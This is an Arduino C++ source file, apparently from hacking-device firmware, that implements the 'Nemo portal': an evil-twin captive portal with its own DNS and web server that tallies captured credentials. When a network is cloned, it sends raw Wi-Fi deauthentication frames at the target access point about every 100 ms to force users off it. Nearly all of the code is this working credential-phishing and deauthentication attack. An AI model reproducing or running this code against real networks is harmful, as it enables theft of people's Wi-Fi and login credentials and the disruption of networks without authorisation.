
#include "Arduino.h"
#include "../common/common.h"
#include "portal.h"

/// NEMO PORTAL

void portal_setup(){
  setupWiFi();
  setupWebServer();
  portal_active = true;
  cursor = 0;
  rstOverride = true;
  printHomeToScreen();
  #if defined(DEAUTHER)                                                                      // DEAUTH
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));                  // DEAUTH
  wsl_bypasser_send_deauth_frame(&ap_record, channel);                                       // DEAUTH  CREATE FRAME
  #endif                                                                                     // DEAUTH
  delay(500); // Prevent switching after menu loads up
}

void portal_loop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials;
      printHomeToScreen();
    }
  }
  if (clone_flg==true) {
    #if defined(DEAUTHER)
      if (target_deauth_flg) {
        if (target_deauth == true) {                                                                 // DEAUTH
          if (deauth_tick==35) {                                                                     // 35 is +-100ms   (Add delay to attack, without reflection on portal)
            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                 // DEAUTH   SEND FRAME
            deauth_tick=0;
          } else { 
            deauth_tick=deauth_tick+1; 
          }
          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
          DISP.setCursor(1, 115);                                                                    // DEAUTH
          DISP.println(TXT_DEAUTH_STOP);                                                             // DEAUTH
          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
        } else{                                                                                      // DEAUTH
          DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
          DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
          DISP.setCursor(1, 115);                                                                    // DEAUTH
          DISP.println(TXT_DEAUTH_START);                                                            // DEAUTH
          DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
        }                                                                                            // DEAUTH
        if (check_select_press()){                                                                    // DEAUTH
          target_deauth = !target_deauth;                                                             // DEAUTH
          delay(500);                                                                                 // DEAUTH
        }
      }
    #endif
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (check_next_press()){
    shutdownWebServer();
    portal_active = false;
    target_deauth_flg = false;                                                                     // DEAUTH
    target_deauth = false;                                                                         // DEAUTH
    clone_flg = false;                                                                             // DEAUTH
    current_proc = 12;
    delay(500);
  }
  check_select_press();
}